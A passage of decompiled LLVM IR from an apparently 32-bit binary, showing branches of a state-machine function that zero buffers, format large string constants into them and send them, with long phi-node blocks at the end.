  store i32 %v2_a528, i32* @r0, align 4
  %v3_a544 = call i32 @function_ab78(i32 %v2_a528, i32 ptrtoint ([27 x i8]* @global_var_e4b4.184 to i32))
  store i32 %v3_a544, i32* %r0.global-to-local, align 4
  %v0_a548 = load i32, i32* @r7, align 4
  %v1_a548 = add i32 %v0_a548, 1044
  %v2_a548 = inttoptr i32 %v1_a548 to i32*
  %v3_a548 = load i32, i32* %v2_a548, align 4
  store i32 %v3_a548, i32* %r3.global-to-local, align 4
  store i32 %v2_a528, i32* %r0.global-to-local, align 4
  %v1_a550 = inttoptr i32 %v3_a548 to i32*
  %v2_a550 = load i32, i32* %v1_a550, align 4
  store i32 %v2_a550, i32* @r1, align 4
  %v2_a554 = bitcast i32* %stack_var_-2304 to i8*
  %v3_a554 = call i32 @function_ab2c(i8* %v2_a554, i32 %v2_a550)
  store i32 ptrtoint ([11 x i8]* @global_var_e43c.178 to i32), i32* @r1, align 4
  store i32 %v2_a528, i32* %r0.global-to-local, align 4
  %v4_a560 = call i32 @function_ab2c(i8* %v2_a554, i32 ptrtoint ([11 x i8]* @global_var_e43c.178 to i32))
  store i32 %v4_a560, i32* %r0.global-to-local, align 4
  %v0_a564 = load i32, i32* @r7, align 4
  %v1_a564 = add i32 %v0_a564, 1044
  %v2_a564 = inttoptr i32 %v1_a564 to i32*
  %v3_a564 = load i32, i32* %v2_a564, align 4
  store i32 %v3_a564, i32* %r3.global-to-local, align 4
  store i32 %v2_a528, i32* %r0.global-to-local, align 4
  %v1_a56c = add i32 %v3_a564, 4
  %v2_a56c = inttoptr i32 %v1_a56c to i32*
  %v3_a56c = load i32, i32* %v2_a56c, align 4
  store i32 %v3_a56c, i32* @r1, align 4
  %v3_a570 = call i32 @function_ab2c(i8* %v2_a554, i32 %v3_a56c)
  store i32 ptrtoint ([14 x i8]* @global_var_e4d0.186 to i32), i32* @r1, align 4
  store i32 %v2_a528, i32* %r0.global-to-local, align 4
  %v4_a57c = call i32 @function_ab2c(i8* %v2_a554, i32 ptrtoint ([14 x i8]* @global_var_e4d0.186 to i32))
  store i32 %v2_a528, i32* @r0, align 4
  %v0_a584 = load i32, i32* @r7, align 4
  %v1_a584 = add i32 %v0_a584, 8
  %v2_a584 = inttoptr i32 %v1_a584 to i32*
  %v3_a584 = load i32, i32* %v2_a584, align 4
  store i32 %v3_a584, i32* @r5, align 4
  %v0_a588 = call i32 @function_ab0c()
  store i32 %v2_a528, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a598 = load i32, i32* @r5, align 4
  store i32 %v0_a598, i32* %r0.global-to-local, align 4
  %v5_a59c = call i32 @function_c04c(i32 %v0_a598, i32* nonnull %stack_var_-2304, i32 %v0_a588, i32 16384)
  store i32 %v5_a59c, i32* %r0.global-to-local, align 4
  %tmp194 = icmp slt i32 %v5_a59c, 1
  br i1 %tmp194, label %dec_label_pc_a8ec, label %dec_label_pc_a5a8

dec_label_pc_a5a8:                                ; preds = %dec_label_pc_a524
  %v3_a5ac = load i8, i8* @global_var_17441.133, align 1
  %v4_a5ac = zext i8 %v3_a5ac to i32
  store i32 %v4_a5ac, i32* %r1.global-to-local, align 4
  %v2_a5b0 = load i8, i8* bitcast (i8** @global_var_17440.132 to i8*), align 4
  %v3_a5b0 = zext i8 %v2_a5b0 to i32
  store i32 %v3_a5b0, i32* %r3.global-to-local, align 4
  %v0_a5b4 = load i32, i32* @r7, align 4
  %v1_a5b4 = add i32 %v0_a5b4, 1042
  %v2_a5b4 = inttoptr i32 %v1_a5b4 to i8*
  %v3_a5b4 = load i8, i8* %v2_a5b4, align 1
  %v4_a5b4 = zext i8 %v3_a5b4 to i32
  %v4_a5b8 = mul nuw nsw i32 %v4_a5ac, 256
  %v5_a5b8 = or i32 %v3_a5b0, %v4_a5b8
  %v1_a5c0 = add nuw nsw i32 %v5_a5b8, 1
  store i32 %v1_a5c0, i32* %r3.global-to-local, align 4
  %v9_a5c4 = icmp eq i32 %v4_a5b4, %v5_a5b8
  br i1 %v9_a5c4, label %dec_label_pc_a8f8, label %dec_label_pc_a5cc

dec_label_pc_a5cc:                                ; preds = %dec_label_pc_a5a8
  %v1_a5cc = add i32 %v0_a5b4, 17
  %v2_a5cc = inttoptr i32 %v1_a5cc to i8*
  %v3_a5cc = load i8, i8* %v2_a5cc, align 1
  %v4_a5cc = zext i8 %v3_a5cc to i32
  store i32 %v4_a5cc, i32* %r3.global-to-local, align 4
  %v7_a5d0 = icmp eq i8 %v3_a5cc, 3
  br i1 %v7_a5d0, label %dec_label_pc_a7dc, label %dec_label_pc_a914

dec_label_pc_a5dc:                                ; preds = %dec_label_pc_9f0c
  %v2_a5e0 = ptrtoint i32* %stack_var_-2304 to i32
  store i32 %v2_a5e0, i32* @r4, align 4
  store i32 %v2_a5e0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v3_a5f0 = call i32 @function_aba4(i32 %v2_a5e0, i32 0, i32 1024)
  store i32 62, i32* @r3, align 4
  store i32 88, i32* %ip.global-to-local, align 4
  store i32 %v2_a5e0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([860 x i8]* @global_var_e4e0.189 to i32), i32* %r1.global-to-local, align 4
  %v4_a614 = call i32 @function_b410(i32 %v2_a5e0, i32 ptrtoint ([860 x i8]* @global_var_e4e0.189 to i32), i32 185)
  br label %dec_label_pc_a8c4

dec_label_pc_a61c:                                ; preds = %dec_label_pc_9f0c
  %v1_a61c = add i32 %v0_9f6c, 17
  %v2_a61c = inttoptr i32 %v1_a61c to i8*
  %v3_a61c = load i8, i8* %v2_a61c, align 1
  %v4_a61c = zext i8 %v3_a61c to i32
  store i32 %v4_a61c, i32* %r3.global-to-local, align 4
  %v7_a620 = icmp eq i8 %v3_a61c, 2
  br i1 %v7_a620, label %.thread41, label %dec_label_pc_a630

.thread41:                                        ; preds = %dec_label_pc_a61c
  store i32 %v0_9f6c, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a630:                                ; preds = %dec_label_pc_a61c
  %v7_a630 = icmp eq i8 %v3_a61c, 3
  br i1 %v7_a630, label %.thread44, label %dec_label_pc_a640

.thread44:                                        ; preds = %dec_label_pc_a630
  store i32 %v0_9f6c, i32* @r0, align 4
  store i32 13, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a640:                                ; preds = %dec_label_pc_a630
  store i32 %stack_var_-2320.9, i32* @r0, align 4
  %v1_a644 = add i32 %v0_9f6c, 8
  %v2_a644 = inttoptr i32 %v1_a644 to i32*
  %v3_a644 = load i32, i32* %v2_a644, align 4
  store i32 %v3_a644, i32* @r4, align 4
  %v0_a648 = call i32 @function_ab0c()
  store i32 %stack_var_-2320.9, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a658 = load i32, i32* @r4, align 4
  store i32 %v0_a658, i32* %r0.global-to-local, align 4
  %v4_a65c = inttoptr i32 %stack_var_-2320.9 to i32*
  %v5_a65c = call i32 @function_c04c(i32 %v0_a658, i32* %v4_a65c, i32 %v0_a648, i32 16384)
  store i32 %v5_a65c, i32* %r0.global-to-local, align 4
  %v8_a664 = icmp sgt i32 %v5_a65c, 1
  br i1 %v8_a664, label %dec_label_pc_a8ec, label %dec_label_pc_a668

dec_label_pc_a668:                                ; preds = %dec_label_pc_a640
  store i32 ptrtoint ([3 x i8]* @global_var_e83c.191 to i32), i32* %r1.global-to-local, align 4
  %v0_a66c = load i32, i32* @r7, align 4
  %v1_a66c = add i32 %v0_a66c, 8
  %v2_a66c = inttoptr i32 %v1_a66c to i32*
  %v3_a66c = load i32, i32* %v2_a66c, align 4
  store i32 %v3_a66c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_a678 = call i32 @function_c04c(i32 %v3_a66c, i32* bitcast ([3 x i8]* @global_var_e83c.191 to i32*), i32 2, i32 16384)
  store i32 %v6_a678, i32* %r0.global-to-local, align 4
  %tmp195 = icmp slt i32 %v6_a678, 1
  br i1 %tmp195, label %dec_label_pc_a8ec, label %.thread129

.thread129:                                       ; preds = %dec_label_pc_a668
  %v5_a680 = load i32, i32* @r7, align 4
  store i32 %v5_a680, i32* @r0, align 4
  store i32 8, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a690:                                ; preds = %dec_label_pc_9f0c
  store i32 %v0_9f6c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([14 x i8]* @global_var_e840.193 to i32), i32* %r1.global-to-local, align 4
  %v3_a698 = call i32 @function_9a20(i32 %v0_9f6c, i32 ptrtoint ([14 x i8]* @global_var_e840.193 to i32))
  store i32 %v3_a698, i32* %r0.global-to-local, align 4
  %v2_a69c = icmp eq i32 %v3_a698, 0
  br i1 %v2_a69c, label %dec_label_pc_a6a4, label %dec_label_pc_a7dc

dec_label_pc_a6a4:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a2f0
  %v0_a6a4 = load i32, i32* @r7, align 4
  store i32 %v0_a6a4, i32* @r0, align 4
  store i32 7, i32* @r1, align 4
  br label %dec_label_pc_a910

dec_label_pc_a6b0:                                ; preds = %dec_label_pc_9f0c
  %v2_a6b4 = ptrtoint i32* %stack_var_-2304 to i32
  store i32 %v2_a6b4, i32* @r4, align 4
  store i32 %v2_a6b4, i32* @r0, align 4
  %v1_a6bc = add i32 %v0_9f6c, 8
  %v2_a6bc = inttoptr i32 %v1_a6bc to i32*
  %v3_a6bc = load i32, i32* %v2_a6bc, align 4
  store i32 %v3_a6bc, i32* @r5, align 4
  %v0_a6c0 = call i32 @function_ab0c()
  store i32 %v2_a6b4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a6d0 = load i32, i32* @r5, align 4
  store i32 %v0_a6d0, i32* %r0.global-to-local, align 4
  %v5_a6d4 = call i32 @function_c04c(i32 %v0_a6d0, i32* nonnull %stack_var_-2304, i32 %v0_a6c0, i32 16384)
  store i32 %v5_a6d4, i32* %r0.global-to-local, align 4
  %tmp196 = icmp slt i32 %v5_a6d4, 1
  br i1 %tmp196, label %dec_label_pc_a8ec, label %dec_label_pc_a6e0

dec_label_pc_a6e0:                                ; preds = %dec_label_pc_a6b0
  %v0_a6e0 = load i32, i32* @r7, align 4
  %v1_a6e0 = add i32 %v0_a6e0, 8
  %v2_a6e0 = inttoptr i32 %v1_a6e0 to i32*
  %v3_a6e0 = load i32, i32* %v2_a6e0, align 4
  store i32 %v3_a6e0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_e83c.191 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_a6f0 = call i32 @function_c04c(i32 %v3_a6e0, i32* bitcast ([3 x i8]* @global_var_e83c.191 to i32*), i32 2, i32 16384)
  store i32 %v6_a6f0, i32* %r0.global-to-local, align 4
  %v1_a6f4 = icmp slt i32 %v6_a6f0, 0
  br i1 %v1_a6f4, label %dec_label_pc_a8ec, label %dec_label_pc_a868

dec_label_pc_a700:                                ; preds = %dec_label_pc_9f0c
  store i32 %stack_var_-2316.9, i32* @r0, align 4
  %v1_a704 = add i32 %v0_9f6c, 8
  %v2_a704 = inttoptr i32 %v1_a704 to i32*
  %v3_a704 = load i32, i32* %v2_a704, align 4
  store i32 %v3_a704, i32* @r4, align 4
  %v0_a708 = call i32 @function_ab0c()
  store i32 %stack_var_-2316.9, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a718 = load i32, i32* @r4, align 4
  store i32 %v0_a718, i32* %r0.global-to-local, align 4
  %v4_a71c = inttoptr i32 %stack_var_-2316.9 to i32*
  %v5_a71c = call i32 @function_c04c(i32 %v0_a718, i32* %v4_a71c, i32 %v0_a708, i32 16384)
  store i32 %v5_a71c, i32* %r0.global-to-local, align 4
  %v1_a720 = icmp slt i32 %v5_a71c, 0
  br i1 %v1_a720, label %dec_label_pc_a8ec, label %dec_label_pc_a728

dec_label_pc_a728:                                ; preds = %dec_label_pc_a700
  %v0_a728 = load i32, i32* @r7, align 4
  %v1_a728 = add i32 %v0_a728, 8
  %v2_a728 = inttoptr i32 %v1_a728 to i32*
  %v3_a728 = load i32, i32* %v2_a728, align 4
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_e83c.191 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_a738 = call i32 @function_c04c(i32 %v3_a728, i32* bitcast ([3 x i8]* @global_var_e83c.191 to i32*), i32 2, i32 16384)
  store i32 %v6_a738, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a8ec

dec_label_pc_a740:                                ; preds = %dec_label_pc_9f0c
  %v1_a740 = add i32 %v0_9f6c, 17
  %v2_a740 = inttoptr i32 %v1_a740 to i8*
  %v3_a740 = load i8, i8* %v2_a740, align 1
  %v4_a740 = zext i8 %v3_a740 to i32
  store i32 %v4_a740, i32* %r3.global-to-local, align 4
  %v7_a744 = icmp eq i8 %v3_a740, 2
  br i1 %v7_a744, label %.thread47, label %dec_label_pc_a754

.thread47:                                        ; preds = %dec_label_pc_a740
  store i32 %v0_9f6c, i32* @r0, align 4
  store i32 7, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a754:                                ; preds = %dec_label_pc_a740
  %v7_a754 = icmp eq i8 %v3_a740, 3
  br i1 %v7_a754, label %.thread50, label %dec_label_pc_a764

.thread50:                                        ; preds = %dec_label_pc_a754
  store i32 %v0_9f6c, i32* @r0, align 4
  store i32 11, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a764:                                ; preds = %dec_label_pc_a754
  %v2_a768 = ptrtoint i32* %stack_var_-2304 to i32
  store i32 %v2_a768, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  store i32 %v2_a768, i32* %r0.global-to-local, align 4
  %v3_a778 = call i32 @function_aba4(i32 %v2_a768, i32 0, i32 1024)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a780 = call i32 @function_81cc(i32 22)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a788 = call i32 @function_83d0(i32 22)
  store i32 %v1_a788, i32* @r5, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a794 = call i32 @function_83d0(i32 22)
  %v0_a798 = load i32, i32* @r5, align 4
  store i32 %v1_a794, i32* @r3, align 4
  store i32 ptrtoint ([852 x i8]* @global_var_e850.195 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_a768, i32* %r0.global-to-local, align 4
  %v4_a7a8 = call i32 @function_b410(i32 %v2_a768, i32 ptrtoint ([852 x i8]* @global_var_e850.195 to i32), i32 %v0_a798)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a7b0 = call i32 @function_82cc(i32 22)
  store i32 %v2_a768, i32* @r0, align 4
  %v0_a7b8 = load i32, i32* @r7, align 4
  %v1_a7b8 = add i32 %v0_a7b8, 8
  %v2_a7b8 = inttoptr i32 %v1_a7b8 to i32*
  %v3_a7b8 = load i32, i32* %v2_a7b8, align 4
  store i32 %v3_a7b8, i32* @r5, align 4
  %v0_a7bc = call i32 @function_ab0c()
  store i32 %v2_a768, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a7cc = load i32, i32* @r5, align 4
  store i32 %v0_a7cc, i32* %r0.global-to-local, align 4
  %v5_a7d0 = call i32 @function_c04c(i32 %v0_a7cc, i32* nonnull %stack_var_-2304, i32 %v0_a7bc, i32 16384)
  store i32 %v5_a7d0, i32* %r0.global-to-local, align 4
  %tmp197 = icmp slt i32 %v5_a7d0, 1
  br i1 %tmp197, label %dec_label_pc_a8ec, label %dec_label_pc_a7dc

dec_label_pc_a7dc:                                ; preds = %dec_label_pc_a5cc, %dec_label_pc_a3ec, %dec_label_pc_a690, %dec_label_pc_a764
  %v0_a7dc = load i32, i32* @r7, align 4
  store i32 %v0_a7dc, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a210

dec_label_pc_a7e8:                                ; preds = %dec_label_pc_9f0c
  %v2_a7ec = ptrtoint i32* %stack_var_-2304 to i32
  store i32 %v2_a7ec, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  store i32 %v2_a7ec, i32* %r0.global-to-local, align 4
  %v3_a7fc = call i32 @function_aba4(i32 %v2_a7ec, i32 0, i32 1024)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a804 = call i32 @function_81cc(i32 22)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a80c = call i32 @function_83d0(i32 22)
  store i32 62, i32* @r3, align 4
  store i32 ptrtoint ([880 x i8]* @global_var_eba4.197 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_a7ec, i32* %r0.global-to-local, align 4
  store i32 88, i32* %ip.global-to-local, align 4
  %v4_a834 = call i32 @function_b410(i32 %v2_a7ec, i32 ptrtoint ([880 x i8]* @global_var_eba4.197 to i32), i32 185)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a83c = call i32 @function_82cc(i32 22)
  store i32 %v2_a7ec, i32* @r0, align 4
  %v0_a844 = load i32, i32* @r7, align 4
  %v1_a844 = add i32 %v0_a844, 8
  %v2_a844 = inttoptr i32 %v1_a844 to i32*
  %v3_a844 = load i32, i32* %v2_a844, align 4
  store i32 %v3_a844, i32* @r5, align 4
  %v0_a848 = call i32 @function_ab0c()
  store i32 %v2_a7ec, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a858 = load i32, i32* @r5, align 4
  store i32 %v0_a858, i32* %r0.global-to-local, align 4
  %v5_a85c = call i32 @function_c04c(i32 %v0_a858, i32* nonnull %stack_var_-2304, i32 %v0_a848, i32 16384)
  store i32 %v5_a85c, i32* %r0.global-to-local, align 4
  %tmp198 = icmp slt i32 %v5_a85c, 1
  br i1 %tmp198, label %dec_label_pc_a8ec, label %dec_label_pc_a868

dec_label_pc_a868:                                ; preds = %dec_label_pc_a6e0, %dec_label_pc_a7e8
  %v0_a868 = load i32, i32* @r7, align 4
  store i32 %v0_a868, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a210

dec_label_pc_a874:                                ; preds = %dec_label_pc_9f0c
  %v2_a878 = ptrtoint i32* %stack_var_-2304 to i32
  store i32 %v2_a878, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  store i32 %v2_a878, i32* %r0.global-to-local, align 4
  %v3_a888 = call i32 @function_aba4(i32 %v2_a878, i32 0, i32 1024)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a890 = call i32 @function_81cc(i32 22)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a898 = call i32 @function_83d0(i32 22)
  store i32 %v1_a898, i32* @r5, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a8a4 = call i32 @function_83d0(i32 22)
  %v0_a8a8 = load i32, i32* @r5, align 4
  store i32 %v1_a8a4, i32* @r3, align 4
  store i32 ptrtoint ([852 x i8]* @global_var_ef14.199 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_a878, i32* %r0.global-to-local, align 4
  %v4_a8b8 = call i32 @function_b410(i32 %v2_a878, i32 ptrtoint ([852 x i8]* @global_var_ef14.199 to i32), i32 %v0_a8a8)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a8c0 = call i32 @function_82cc(i32 22)
  br label %dec_label_pc_a8c4

dec_label_pc_a8c4:                                ; preds = %dec_label_pc_a5dc, %dec_label_pc_a874
  %v1_a8c4.pre-phi = phi i32 [ %v2_a5e0, %dec_label_pc_a5dc ], [ %v2_a878, %dec_label_pc_a874 ]
  store i32 %v1_a8c4.pre-phi, i32* @r0, align 4
  %v0_a8c8 = load i32, i32* @r7, align 4
  %v1_a8c8 = add i32 %v0_a8c8, 8
  %v2_a8c8 = inttoptr i32 %v1_a8c8 to i32*
  %v3_a8c8 = load i32, i32* %v2_a8c8, align 4
  store i32 %v3_a8c8, i32* @r5, align 4
  %v0_a8cc = call i32 @function_ab0c()
  store i32 %v1_a8c4.pre-phi, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a8dc = load i32, i32* @r5, align 4
  store i32 %v0_a8dc, i32* %r0.global-to-local, align 4
  %v5_a8e0 = call i32 @function_c04c(i32 %v0_a8dc, i32* nonnull %stack_var_-2304, i32 %v0_a8cc, i32 16384)
  store i32 %v5_a8e0, i32* %r0.global-to-local, align 4
  %v5_a8e8 = icmp sgt i32 %v5_a8e0, 0
  br i1 %v5_a8e8, label %dec_label_pc_a8c4.dec_label_pc_a8f8_crit_edge, label %dec_label_pc_a8ec

dec_label_pc_a8c4.dec_label_pc_a8f8_crit_edge:    ; preds = %dec_label_pc_a8c4
  %v0_a8f8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a8f8

dec_label_pc_a8ec:                                ; preds = %dec_label_pc_a668, %dec_label_pc_a2c8, %dec_label_pc_a13c, %dec_label_pc_a7e8, %dec_label_pc_a764, %dec_label_pc_a700, %dec_label_pc_a6e0, %dec_label_pc_a6b0, %dec_label_pc_a640, %dec_label_pc_a8c4, %dec_label_pc_a524, %dec_label_pc_a3ec, %dec_label_pc_a728
  %stack_var_-2328.4 = phi i32 [ %stack_var_-2328.7, %dec_label_pc_a524 ], [ %stack_var_-2328.7, %dec_label_pc_a700 ], [ %stack_var_-2328.7, %dec_label_pc_a728 ], [ %stack_var_-2328.7, %dec_label_pc_a8c4 ], [ %stack_var_-2328.7, %dec_label_pc_a6b0 ], [ %stack_var_-2328.7, %dec_label_pc_a6e0 ], [ %stack_var_-2328.7, %dec_label_pc_a3ec ], [ %stack_var_-2328.7, %dec_label_pc_a7e8 ], [ %stack_var_-2328.7, %dec_label_pc_a764 ], [ %stack_var_-2328.7, %dec_label_pc_a640 ], [ %stack_var_-2328.7, %dec_label_pc_a13c ], [ %stack_var_-2328.3, %dec_label_pc_a2c8 ], [ %stack_var_-2328.7, %dec_label_pc_a668 ]
  %stack_var_-2308.3 = phi i32 [ %stack_var_-2308.6, %dec_label_pc_a524 ], [ %stack_var_-2308.6, %dec_label_pc_a700 ], [ %stack_var_-2308.6, %dec_label_pc_a728 ], [ %stack_var_-2308.6, %dec_label_pc_a8c4 ], [ %stack_var_-2308.6, %dec_label_pc_a6b0 ], [ %stack_var_-2308.6, %dec_label_pc_a6e0 ], [ %stack_var_-2308.6, %dec_label_pc_a3ec ], [ %stack_var_-2308.6, %dec_label_pc_a7e8 ], [ %stack_var_-2308.6, %dec_label_pc_a764 ], [ %stack_var_-2308.6, %dec_label_pc_a640 ], [ %stack_var_-2308.6, %dec_label_pc_a13c ], [ %stack_var_-2308.2, %dec_label_pc_a2c8 ], [ %stack_var_-2308.6, %dec_label_pc_a668 ]
  %stack_var_-2324.7 = phi i8 [ %stack_var_-2324.10, %dec_label_pc_a524 ], [ %stack_var_-2324.10, %dec_label_pc_a700 ], [ %stack_var_-2324.10, %dec_label_pc_a728 ], [ %stack_var_-2324.10, %dec_label_pc_a8c4 ], [ %stack_var_-2324.10, %dec_label_pc_a6b0 ], [ %stack_var_-2324.10, %dec_label_pc_a6e0 ], [ %stack_var_-2324.10, %dec_label_pc_a3ec ], [ %stack_var_-2324.10, %dec_label_pc_a7e8 ], [ %stack_var_-2324.10, %dec_label_pc_a764 ], [ %stack_var_-2324.10, %dec_label_pc_a640 ], [ %stack_var_-2324.10, %dec_label_pc_a13c ], [ %stack_var_-2324.6, %dec_label_pc_a2c8 ], [ %stack_var_-2324.10, %dec_label_pc_a668 ]
  %stack_var_-2316.6 = phi i32 [ %stack_var_-2316.9, %dec_label_pc_a524 ], [ %stack_var_-2316.9, %dec_label_pc_a700 ], [ %stack_var_-2316.9, %dec_label_pc_a728 ], [ %stack_var_-2316.9, %dec_label_pc_a8c4 ], [ %stack_var_-2316.9, %dec_label_pc_a6b0 ], [ %stack_var_-2316.9, %dec_label_pc_a6e0 ], [ %stack_var_-2316.9, %dec_label_pc_a3ec ], [ %stack_var_-2316.9, %dec_label_pc_a7e8 ], [ %stack_var_-2316.9, %dec_label_pc_a764 ], [ %stack_var_-2316.9, %dec_label_pc_a640 ], [ %stack_var_-2316.9, %dec_label_pc_a13c ], [ %stack_var_-2316.5, %dec_label_pc_a2c8 ], [ %stack_var_-2316.9, %dec_label_pc_a668 ]
  %stack_var_-2320.6 = phi i32 [ %stack_var_-2320.9, %dec_label_pc_a524 ], [ %stack_var_-2320.9, %dec_label_pc_a700 ], [ %stack_var_-2320.9, %dec_label_pc_a728 ], [ %stack_var_-2320.9, %dec_label_pc_a8c4 ], [ %stack_var_-2320.9, %dec_label_pc_a6b0 ], [ %stack_var_-2320.9, %dec_label_pc_a6e0 ], [ %stack_var_-2320.9, %dec_label_pc_a3ec ], [ %stack_var_-2320.9, %dec_label_pc_a7e8 ], [ %stack_var_-2320.9, %dec_label_pc_a764 ], [ %stack_var_-2320.9, %dec_label_pc_a640 ], [ %stack_var_-2320.9, %dec_label_pc_a13c ], [ %stack_var_-2320.5, %dec_label_pc_a2c8 ], [ %stack_var_-2320.9, %dec_label_pc_a668 ]
  %stack_var_-2312.5 = phi i32 [ %stack_var_-2312.8, %dec_label_pc_a524 ], [ %stack_var_-2312.8, %dec_label_pc_a700 ], [ %stack_var_-2312.8, %dec_label_pc_a728 ], [ %stack_var_-2312.8, %dec_label_pc_a8c4 ], [ %stack_var_-2312.8, %dec_label_pc_a6b0 ], [ %stack_var_-2312.8, %dec_label_pc_a6e0 ], [ %stack_var_-2312.8, %dec_label_pc_a3ec ], [ %stack_var_-2312.8, %dec_label_pc_a7e8 ], [ %stack_var_-2312.8, %dec_label_pc_a764 ], [ %stack_var_-2312.8, %dec_label_pc_a640 ], [ %stack_var_-2312.8, %dec_label_pc_a13c ], [ %stack_var_-2312.4, %dec_label_pc_a2c8 ], [ %stack_var_-2312.8, %dec_label_pc_a668 ]
  %v0_a8ec = load i32, i32* @r7, align 4
  store i32 %v0_a8ec, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a210

dec_label_pc_a8f8:                                ; preds = %dec_label_pc_a8c4.dec_label_pc_a8f8_crit_edge, %dec_label_pc_a5a8
  %v0_a8f8 = phi i32 [ %v0_a8f8.pre, %dec_label_pc_a8c4.dec_label_pc_a8f8_crit_edge ], [ %v0_a5b4, %dec_label_pc_a5a8 ]
  store i32 %v0_a8f8, i32* @r0, align 4
  store i32 15, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a900:                                ; preds = %.thread129, %.thread118, %.thread31, %.thread34, %.thread19, %.thread22, %.thread25, %.thread28, %.thread41, %.thread44, %.thread47, %.thread50, %dec_label_pc_a218, %dec_label_pc_a14c, %dec_label_pc_a8f8
  %stack_var_-2328.5 = phi i32 [ %stack_var_-2328.3, %.thread31 ], [ %stack_var_-2328.7, %dec_label_pc_a8f8 ], [ %stack_var_-2328.7, %.thread47 ], [ %stack_var_-2328.7, %.thread50 ], [ %stack_var_-2328.7, %.thread41 ], [ %stack_var_-2328.7, %.thread44 ], [ %stack_var_-2328.7, %.thread19 ], [ %stack_var_-2328.7, %.thread22 ], [ %stack_var_-2328.7, %.thread25 ], [ %stack_var_-2328.7, %.thread28 ], [ %stack_var_-2328.7, %dec_label_pc_a218 ], [ %stack_var_-2328.7, %dec_label_pc_a14c ], [ %stack_var_-2328.3, %.thread34 ], [ %stack_var_-2328.3, %.thread118 ], [ %stack_var_-2328.7, %.thread129 ]
  %stack_var_-2308.4 = phi i32 [ %stack_var_-2308.2, %.thread31 ], [ %stack_var_-2308.6, %dec_label_pc_a8f8 ], [ %stack_var_-2308.6, %.thread47 ], [ %stack_var_-2308.6, %.thread50 ], [ %stack_var_-2308.6, %.thread41 ], [ %stack_var_-2308.6, %.thread44 ], [ %stack_var_-2308.6, %.thread19 ], [ %stack_var_-2308.6, %.thread22 ], [ %stack_var_-2308.6, %.thread25 ], [ %stack_var_-2308.6, %.thread28 ], [ %stack_var_-2308.6, %dec_label_pc_a218 ], [ %stack_var_-2308.6, %dec_label_pc_a14c ], [ %stack_var_-2308.2, %.thread34 ], [ %stack_var_-2308.2, %.thread118 ], [ %stack_var_-2308.6, %.thread129 ]
  %stack_var_-2324.8 = phi i8 [ %stack_var_-2324.6, %.thread31 ], [ %stack_var_-2324.10, %dec_label_pc_a8f8 ], [ %stack_var_-2324.10, %.thread47 ], [ %stack_var_-2324.10, %.thread50 ], [ %stack_var_-2324.10, %.thread41 ], [ %stack_var_-2324.10, %.thread44 ], [ %stack_var_-2324.10, %.thread19 ], [ %stack_var_-2324.10, %.thread22 ], [ %stack_var_-2324.10, %.thread25 ], [ %stack_var_-2324.10, %.thread28 ], [ %stack_var_-2324.10, %dec_label_pc_a218 ], [ %stack_var_-2324.10, %dec_label_pc_a14c ], [ %stack_var_-2324.6, %.thread34 ], [ %stack_var_-2324.6, %.thread118 ], [ %stack_var_-2324.10, %.thread129 ]
